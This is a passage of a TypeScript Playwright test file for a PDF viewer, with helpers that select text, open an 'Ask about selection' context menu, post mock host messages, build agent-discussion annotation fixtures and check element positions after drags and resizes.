    const text = span?.querySelector('.pdf-text-glyphs')?.firstChild;
    if (!text) throw new Error(`Missing fixture text: ${selectedText}`);
    const offset = span.textContent?.indexOf(selectedText) ?? -1;
    const range = document.createRange();
    range.setStart(text, offset);
    range.setEnd(text, offset + selectedText.length);
    const selection = window.getSelection();
    selection?.removeAllRanges();
    selection?.addRange(range);
    document.querySelector('#page-container')?.dispatchEvent(new MouseEvent('mouseup', { bubbles: true, button: 0 }));
  }, quote);
  await expect(page.locator('#selection-toolbar')).toBeVisible();
}

async function selectAcrossTextItems(page: Page, startText: string, endText: string): Promise<void> {
  const startItem = page.locator('#page-1 .text-layer span[data-item-index]').filter({ hasText: startText });
  const endItem = page.locator('#page-1 .text-layer span[data-item-index]').filter({ hasText: endText });
  await expect(startItem).toHaveCount(1);
  await expect(endItem).toHaveCount(1);
  const start = await requiredBox(startItem);
  const end = await requiredBox(endItem);
  await page.mouse.move(start.x + 1, start.y + start.height / 2);
  await page.mouse.down();
  await page.mouse.move(end.x + end.width - 1, end.y + end.height / 2, { steps: 12 });
  await page.mouse.up();
  await expect(page.locator('#selection-toolbar')).toBeVisible();
  await expect(page.locator('#page-1 .pdf-selection-rect')).toHaveCount(2);
}

async function openSelectionContextMenu(page: Page): Promise<void> {
  await page.evaluate(() => {
    const selection = window.getSelection();
    const range = selection?.rangeCount ? selection.getRangeAt(0) : undefined;
    const span = range?.startContainer.parentElement;
    const rect = range?.getBoundingClientRect();
    if (!span || !rect) throw new Error('Missing active PDF selection');
    span.dispatchEvent(new MouseEvent('contextmenu', {
      bubbles: true,
      cancelable: true,
      clientX: rect.left + rect.width / 2,
      clientY: rect.top + rect.height / 2,
    }));
  });
  await expect(page.getByRole('menu')).toBeVisible();
}

async function askAbout(page: Page, quote: string): Promise<void> {
  await selectText(page, quote);
  await openSelectionContextMenu(page);
  await page.getByRole('menuitem', { name: 'Ask about selection…', exact: true }).click();
  await expect(page.getByRole('complementary', { name: 'Ask about selection' })).toBeVisible();
}

async function messagesOfType(page: Page, type: string): Promise<any[]> {
  return page.evaluate((messageType) => (window.__mockMessages ?? []).filter(message => message.type === messageType), type);
}

async function lastMessage(page: Page, type: string): Promise<any> {
  await expect.poll(() => messagesOfType(page, type)).not.toHaveLength(0);
  return page.evaluate((messageType) => (window.__mockMessages ?? []).filter(message => message.type === messageType).at(-1), type);
}

async function postHost(page: Page, message: Record<string, unknown>): Promise<void> {
  await page.evaluate(hostMessage => window.postMessage(hostMessage, '*'), message);
}

function baseAnchor() {
  return {
    uri: 'file:///fixture.pdf',
    page: 1,
    quote: 'FlashAttention uses tiling',
    prefix: 'The paper says',
    suffix: 'to reduce HBM accesses.',
    rects: [[72, 90, 230, 112]],
    portableUrl: 'raw/pdf/fixture.pdf#page=1:~:text=FlashAttention%20uses%20tiling',
  };
}

function message(id: string, role: 'user' | 'assistant', markdown: string) {
  return { id, role, markdown, createdAt: '2026-07-15T12:00:00.000Z' };
}

function annotation(overrides: Record<string, any> = {}) {
  return {
    id: 'discussion-1',
    kind: 'agent_discussion',
    selectionKey: 'selection-1',
    anchor: baseAnchor(),
    messages: [message('q-default', 'user', 'Why does this matter?')],
    lastTurn: { status: 'idle' },
    createdAt: '2026-07-15T12:00:00.000Z',
    updatedAt: '2026-07-15T12:00:00.000Z',
    ...overrides,
  };
}

function cssAlpha(color: string): number {
  const values = color.match(/[\d.]+/gu)?.map(Number) ?? [];
  if (color.startsWith('rgba')) return values[3] ?? 0;
  return values.length >= 3 ? 1 : 0;
}

type ElementBox = { x: number; y: number; width: number; height: number };

async function requiredBox(locator: Locator): Promise<ElementBox> {
  const box = await locator.boundingBox();
  expect(box).not.toBeNull();
  return box!;
}

async function selectedRangeBox(page: Page): Promise<ElementBox> {
  return page.evaluate(() => {
    const selection = window.getSelection();
    if (!selection?.rangeCount) throw new Error('Missing active PDF selection');
    const rect = selection.getRangeAt(0).getBoundingClientRect();
    return { x: rect.x, y: rect.y, width: rect.width, height: rect.height };
  });
}

async function dragBy(page: Page, handle: Locator, deltaX: number, deltaY: number): Promise<void> {
  const box = await requiredBox(handle);
  const startX = box.x + Math.min(92, box.width / 2);
  const startY = box.y + box.height / 2;
  await page.mouse.move(startX, startY);
  await page.mouse.down();
  await page.mouse.move(startX + deltaX, startY + deltaY, { steps: 6 });
  await page.mouse.up();
}

async function resizeBy(page: Page, handle: Locator, deltaX: number, deltaY: number): Promise<void> {
  const box = await requiredBox(handle);
  const startX = box.x + box.width / 2;
  const startY = box.y + box.height / 2;
  await page.mouse.move(startX, startY);
  await page.mouse.down();
  await page.mouse.move(startX + deltaX, startY + deltaY, { steps: 6 });
  await page.mouse.up();
}

function overlapArea(first: ElementBox, second: ElementBox): number {
  const width = Math.max(0, Math.min(first.x + first.width, second.x + second.width) - Math.max(first.x, second.x));
  const height = Math.max(0, Math.min(first.y + first.height, second.y + second.height) - Math.max(first.y, second.y));
  return Math.round(width * height);
}

function expectBoxNear(actual: ElementBox, expected: ElementBox): void {
  expect(Math.abs(actual.x - expected.x)).toBeLessThanOrEqual(2);
  expect(Math.abs(actual.y - expected.y)).toBeLessThanOrEqual(2);
  expect(Math.abs(actual.width - expected.width)).toBeLessThanOrEqual(2);
  expect(Math.abs(actual.height - expected.height)).toBeLessThanOrEqual(2);
}
